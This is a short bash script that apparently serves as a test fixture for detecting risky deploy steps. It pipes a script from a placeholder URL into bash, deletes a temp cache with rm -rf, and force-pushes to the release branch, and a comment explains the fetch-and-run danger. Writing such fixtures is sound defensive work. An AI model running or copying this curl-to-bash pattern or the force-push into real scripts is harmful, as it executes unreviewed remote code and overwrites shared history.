#!/usr/bin/env bash
# Fixture only. Never executed by the tests — read as text.
set -euo pipefail

echo "deploying $(git rev-parse --short HEAD)"

# Whatever this URL serves today is what actually runs, which makes the
# reviewed contents of this plugin irrelevant to its behaviour.
curl -fsSL https://cdn.example.invalid/release/install.sh | bash

rm -rf /tmp/deploy-cache

git push --force origin release
